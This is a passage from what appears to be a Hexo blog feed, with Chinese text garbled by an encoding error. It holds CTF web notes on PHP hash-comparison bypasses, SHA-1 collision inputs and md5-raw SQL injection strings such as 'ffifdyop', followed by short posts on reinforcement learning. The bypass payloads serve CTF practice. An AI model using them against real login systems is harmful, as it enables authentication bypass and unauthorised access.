class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>è¦ç”¨bpæ”¹ï¼Œä¸èƒ½ä½¿ç”¨hackbar</p><h4 id="sha1-2"><a class="markdownIt-Anchor" href="#sha1-2"></a> sha1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span>&amp;&amp;<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a</span>)===<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$b</span>)<br></code></pre></td></tr></table></figure><p>1.æ•°ç»„ç»•è¿‡</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">?a<span class="hljs-comment">[]</span>=1a&amp;b<span class="hljs-comment">[]</span>=2<br></code></pre></td></tr></table></figure><p>2.å¦‚æœè¦æ±‚aï¼Œbæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¿›è¡Œhashç¢°æ’</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span><br>b<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure><h3 id="å¥‡å¦™çš„å­—ç¬¦ä¸²"><a class="markdownIt-Anchor" href="#å¥‡å¦™çš„å­—ç¬¦ä¸²"></a> å¥‡å¦™çš„å­—ç¬¦ä¸²</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag is :&#x27;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¯†ç é”™è¯¯!&#x27;</span>;<br>        &#125; <br></code></pre></td></tr></table></figure><h4 id="ffifdyop"><a class="markdownIt-Anchor" href="#ffifdyop"></a> ffifdyop</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">content:</span> ffifdyop<br><span class="hljs-symbol">hex:</span> <span class="hljs-number">276</span>f<span class="hljs-number">722736</span><span class="hljs-keyword">c</span><span class="hljs-number">95</span>d<span class="hljs-number">99e921722</span>cf<span class="hljs-number">9</span>ed<span class="hljs-number">621</span><span class="hljs-keyword">c</span><br><span class="hljs-symbol">raw:</span> &#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">6</span>\xc<span class="hljs-number">9</span>]\<span class="hljs-keyword">x</span><span class="hljs-number">99</span>\xe<span class="hljs-number">9</span><span class="hljs-title">!r</span><span class="hljs-punctuation">,</span>\xf<span class="hljs-number">9</span>\xedb\<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span><br><span class="hljs-symbol">string:</span> &#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">6</span>]<span class="hljs-title">!r</span><span class="hljs-punctuation">,</span>b<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">select * <span class="hljs-keyword">from</span> admin where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;6&lt;ä¹±ç &gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>MD5å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°é»˜è®¤å€¼ä¸ºfalseï¼Œè¡¨ç¤ºä¼šäº§ç”Ÿä¸€ä¸ª32ä½çš„å¸¸è§„MD5å€¼ã€‚è€Œtrueï¼Œåˆ™æ˜¯åŸç”Ÿçš„16å­—ç¬¦çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œè¿™æ„å‘³ç€ï¼Œè¿™é‡Œæœ‰å¯èƒ½äººä¸ºè¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»åŠ å¯†åçš„å€¼ä»¥äºŒè¿›åˆ¶æ ¼å¼ç”Ÿæˆï¼Œåˆè¢«å½“å­—ç¬¦ä¸²å¤„ç†ï¼Œå¾ˆå¯èƒ½æ–°çš„å­—ç¬¦ä¸²ä¸­å«æœ‰å¯ä»¥æ„é€ SQLä¸‡èƒ½å¯†ç çš„â€™orâ€™çš„éƒ¨åˆ†ã€‚</p><h4 id="129581926211651571912466741651878684928"><a class="markdownIt-Anchor" href="#129581926211651571912466741651878684928"></a> 129581926211651571912466741651878684928</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">content: <span class="hljs-number">129581926211651571912466741651878684928</span><br><span class="hljs-built_in">hex</span>: <span class="hljs-number">06</span>da5430449f8f6f23dfc1276f722738<br>raw: \x06\xdaT0D\x9f\x8fo<span class="hljs-meta">#\xdf\xc1<span class="hljs-string">&#x27;or&#x27;</span>8</span><br><span class="hljs-built_in">string</span>: T0Do<span class="hljs-meta">#<span class="hljs-string">&#x27;or&#x27;</span>8</span><br></code></pre></td></tr></table></figure><h3 id="çŸ­å°çš„hashçˆ†ç ´"><a class="markdownIt-Anchor" href="#çŸ­å°çš„hashçˆ†ç ´"></a> çŸ­å°çš„hashçˆ†ç ´</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span>  string<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000000</span>):<br>    <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-built_in">str</span>(i).encode()).hexdigest()[-<span class="hljs-number">6</span>:]==<span class="hljs-string">&#x27;8b184b&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Q_Learning</title>
    <link href="/2023/01/19/Q-Learning/"/>
    <url>/2023/01/19/Q-Learning/</url>
    
    <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Q-Learning æ˜¯å¼ºåŒ–å­¦ä¹ ä¸€ç§æ— æ¨¡å‹çš„åŸºäºå€¼çš„å­¦ä¹ ç®—æ³•ï¼Œä¹Ÿå¯çœ‹åšå¼‚æ­¥åŠ¨æ€è§„åˆ’çš„ä¸€ç§æ–¹æ³•ã€‚</p><p>Q-table:ç”¨äºå­˜æ”¾æ¯ä¸ªçŠ¶æ€é‡‡å–æŸç§è¡Œä¸ºåæœ€å¤§çš„å¥–åŠ±æœŸæœ›</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a><strong>åŸç†</strong></h3><p>ç›®çš„ï¼šåˆ©ç”¨Qå‡½æ•°å¯»æ‰¾æœ€ä¼˜çš„ç­–ç•¥ï¼Œå³æœ€å¤§åŒ–Qå‡½æ•°çš„å€¼ï¼ˆç»™å®šä¸€ä¸ªçŠ¶æ€å’ŒåŠ¨ä½œæ—¶çš„æœªæ¥å¥–åŠ±æœŸæœ›ï¼‰</p><p>æ–¹æ³•ï¼šé‡‡å–ä¸€ä¸ªè¡Œä¸ºåå°±æ ¹æ€§Q-table</p><p>ç®—æ³•æµç¨‹ï¼š<img src="/2023/01/19/Q-Learning/1.png" class=""></p><img src="/2023/01/19/Q-Learning/2.png" class=""><h3 id="ç®—æ³•"><a href="#ç®—æ³•" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h3><img src="/2023/01/19/Q-Learning/3.png" class=""><h3 id="å®ä¾‹ä»£ç "><a href="#å®ä¾‹ä»£ç " class="headerlink" title="å®ä¾‹ä»£ç "></a>å®ä¾‹ä»£ç </h3><p><a href="https://github.com/fru1ts/fru1ts.github.io/tree/main/2023/01/19/Q-Learning">https://github.com/fru1ts/fru1ts.github.io/tree/main/2023/01/19/Q-Learning</a></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><em>å‚è€ƒ</em></h3><p><em>Watkins C J C H, Dayan P. Q-learning[J]. Machine learning, 1992, 8(3): 279-292.</em></p><p><em><a href="https://www.freecodecamp.org/news/diving-deeper-into-reinforcement-learning-with-q-learning-c18d0db58efe">https://www.freecodecamp.org/news/diving-deeper-into-reinforcement-learning-with-q-learning-c18d0db58efe</a></em></p><p><em><a href="https://blog.csdn.net/weixin_44732379/article/details/127812712">https://blog.csdn.net/weixin_44732379/article/details/127812712</a></em></p><p><em><a href="https://mofanpy.com/">https://mofanpy.com/</a></em></p><p><em><a href="https://github.com/MorvanZhou/Reinforcement-learning-with-tensorflow/tree/master/contents">https://github.com/MorvanZhou/Reinforcement-learning-with-tensorflow/tree/master/contents</a></em></p>]]></content>
    
    
    <categories>
      
      <category>å¼ºåŒ–å­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¼ºåŒ–å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŠ¨æ€è§„åˆ’</title>
    <link href="/2023/01/14/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <url>/2023/01/14/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    
    <content type="html"><![CDATA[<img src="/2023/01/14/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.png" class=""><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><p><em>ã€Šå¼ºåŒ–å­¦ä¹ ã€‹ ä½œè€…ï¼šé‚¹ä¼Ÿ, é¬²ç², åˆ˜æ˜±æ“ï¼Œå‡ºç‰ˆç¤¾ï¼šæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾ï¼Œå‡ºç‰ˆæ—¶é—´ï¼š2020</em></p>]]></content>
    
    
    <categories>
      
      <category>å¼ºåŒ–å­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¼ºåŒ–å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‰ç«¯js</title>
    <link href="/2023/01/14/%E5%89%8D%E7%AB%AFjs/"/>
    <url>/2023/01/14/%E5%89%8D%E7%AB%AFjs/</url>
    
    <content type="html"><![CDATA[<h3 id="å‰ç«¯æ¸¸æˆå±€"><a class="markdownIt-Anchor" href="#å‰ç«¯æ¸¸æˆå±€"></a> å‰ç«¯æ¸¸æˆå±€</h3><p>å¯¹äºæ¸¸æˆæ˜¯çº¯å‰ç«¯åˆ¶ä½œçš„ï¼Œæ‰€ä»¥çš„æ¸¸æˆæ•°æ®éƒ½ä¼šå­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥flagå…¶å®å°±å­˜åœ¨ç½‘é¡µçš„æŸä¸ªæ–‡ä»¶ä¸­ï¼Œä¸€èˆ¬éƒ½æ˜¯è¢«æ··æ·†æˆ–åŠ å¯†çš„</p><p>æ¸¸æˆå±€çš„æ€è·¯ä¸€èˆ¬æ˜¯é€šè¿‡å°±å¯ä»¥è·å¾—flag</p><p>æ€»ç»“å‡ ä¸ªæ–¹æ³•</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">1.</span>ç›´æ¥å¹²ï¼ŒæŠŠæ¸¸æˆæ‰“é€šäº†<br><span class="hljs-number">2.</span>åœ¨jsæ–‡ä»¶çœ‹é€šè¿‡é€»è¾‘ï¼Œæ‰¾åˆ°é€šè¿‡æ—¶è°ƒç”¨çš„å‡½æ•°<span class="hljs-comment">(ä¸€èˆ¬flagå°±åœ¨è¿™ä¸ªå‡½æ•°ä¸­)</span>ï¼Œå¯ä»¥å°†å‡½æ•°åœ¨æ§åˆ¶å°è°ƒç”¨ä¸€ä¸‹ï¼›ä¹Ÿæœ‰ä¸€äº›æ˜¯éœ€è¦åˆ¤æ–­åˆ†æ•°ä¹‹ç±»çš„ï¼Œè¿™å°±éœ€è¦æ‰‹åŠ¨ä¿®æ”¹å‡½æ•°å†è°ƒç”¨<br><span class="hljs-number">3.</span>æ ¹æ®æºä»£ç é€»è¾‘è®¾ç½®æ–­ç‚¹ï¼Œè¿è¡Œæ¸¸æˆï¼Œè°ƒè¯•æ—¶å¯ä¿®æ”¹å€¼<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹</title>
    <link href="/2023/01/12/%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E5%86%B3%E7%AD%96%E8%BF%87%E7%A8%8B/"/>
    <url>/2023/01/12/%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E5%86%B3%E7%AD%96%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<img src="/2023/01/12/%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E5%86%B3%E7%AD%96%E8%BF%87%E7%A8%8B/1.png" class=""><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><p><em>ã€Šå¼ºåŒ–å­¦ä¹ ã€‹ ä½œè€…ï¼šé‚¹ä¼Ÿ, é¬²ç², åˆ˜æ˜±æ“ï¼Œå‡ºç‰ˆç¤¾ï¼šæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾ï¼Œå‡ºç‰ˆæ—¶é—´ï¼š2020</em></p>]]></content>
    
    
    <categories>
      
      <category>å¼ºåŒ–å­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¼ºåŒ–å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºåŒ–å­¦ä¹ æ¦‚è¿°</title>
    <link href="/2023/01/11/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/01/11/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<img src="/2023/01/11/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/1.png" class=""><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><p><em>ã€Šå¼ºåŒ–å­¦ä¹ ã€‹ ä½œè€…ï¼šé‚¹ä¼Ÿ, é¬²ç², åˆ˜æ˜±æ“ï¼Œå‡ºç‰ˆç¤¾ï¼šæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾ï¼Œå‡ºç‰ˆæ—¶é—´ï¼š2020</em></p><p><em><a href="https://www.zhihu.com/question/59122948">https://www.zhihu.com/question/59122948</a></em></p>]]></content>
    
    
    <categories>
      
      <category>å¼ºåŒ–å­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¼ºåŒ–å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME</title>
    <link href="/2023/01/05/HGAME/"/>
    <url>/2023/01/05/HGAME/</url>
